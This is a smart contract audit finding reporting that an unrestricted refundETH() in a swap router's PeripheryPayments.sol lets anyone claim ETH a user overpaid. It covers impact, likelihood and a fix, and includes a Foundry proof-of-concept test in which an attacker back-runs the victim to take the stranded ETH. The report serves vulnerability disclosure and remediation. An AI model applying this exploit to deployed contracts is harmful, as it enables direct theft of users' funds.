### Title
Unrestricted `refundETH()` Allows Any Caller to Steal Residual ETH Left on the Router — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` unconditionally transfers the router's entire ETH balance to `msg.sender` with no access control. Because every payable swap entry-point (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) accepts `msg.value` and the internal `pay()` function only wraps the exact amount needed for the swap, any excess ETH sent by a victim remains on the router after the swap call returns. A subsequent call to `refundETH()` by any address — including an attacker — drains that residual ETH.

---

### Finding Description

`refundETH()` is implemented as:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // no caller check
    }
}
``` [1](#0-0) 

The internal `pay()` function, when `token == WETH` and the router holds native ETH, wraps **exactly** the amount owed to the pool and leaves any surplus on the contract:

```solidity
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
    // nativeBalance - value remains as ETH on the router
}
``` [2](#0-1) 

All four swap entry-points are `payable`: [3](#0-2) 

The intended safe pattern is `multicall{value}([swap(...), refundETH()])` in a single transaction, where `delegatecall` preserves `msg.sender` so the refund returns to the victim. The vulnerability arises when a user calls a swap function directly (not via `multicall`) with `msg.value > amountIn`, or uses `multicall` but omits `refundETH`. In either case the excess ETH is stranded on the router between transactions and any address can call `refundETH()` to claim it.

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) does **not** prevent this: it only blocks plain ETH transfers; `msg.value` attached to a payable function call bypasses `receive()` entirely. [4](#0-3) 

---

### Impact Explanation

Direct theft of user ETH principal. A victim who sends `exactInputSingle{value: 2 ether}(amountIn: 1000)` loses `2 ether − 1000 wei` to any attacker who calls `refundETH()` in the next transaction. The loss is bounded only by the victim's `msg.value` excess, which can be arbitrarily large. This satisfies the High threshold (direct loss of user principal).

---

### Likelihood Explanation

- The swap functions are documented and tested with native ETH input via `multicall`, but nothing prevents a user from calling them directly with excess ETH.
- The existing test `test_multicall_ethInput_exactInputSingle_refundsUnusedEth` shows the router is expected to hold residual ETH mid-multicall, confirming the ETH-stranding state is reachable.
- An attacker can monitor the mempool for payable swap calls with `msg.value > amountIn` and back-run them with `refundETH()`. [5](#0-4) 

---

### Recommendation

Restrict `refundETH()` so it can only be called as part of a `multicall` (i.e., via `delegatecall` from the same contract), or record the original `msg.sender` of the outermost `multicall` in transient storage and require `refundETH()` to refund only that address. Alternatively, remove the standalone `refundETH()` entrypoint and only expose refund logic internally at the end of each swap function when `address(this).balance > 0`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "../contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "../contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // deploy router (weth + factory stubs omitted for brevity)
        // fund victim with 2 ETH
        vm.deal(victim, 2 ether);
    }

    function test_attackerStealsResidualETH() public {
        // Victim calls exactInputSingle directly with msg.value = 2 ether
        // but amountIn = 1000 wei (WETH pool). pay() wraps 1000 wei;
        // ~2 ether - 1000 wei remains on the router.
        vm.prank(victim);
        router.exactInputSingle{value: 2 ether}(
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool: address(pool),
                tokenIn: address(weth),
                tokenOut: address(token1),
                zeroForOne: true,
                amountIn: 1000,
                amountOutMinimum: 0,
                recipient: victim,
                deadline: block.timestamp + 1,
                priceLimitX64: 0,
                extensionData: ""
            })
        );

        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 0, "residual ETH on router");

        // Attacker calls refundETH() — no access control, steals all residual ETH
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance - attackerBefore, routerBalance, "attacker stole victim ETH");
        assertEq(address(router).balance, 0, "router drained");
    }
}
```
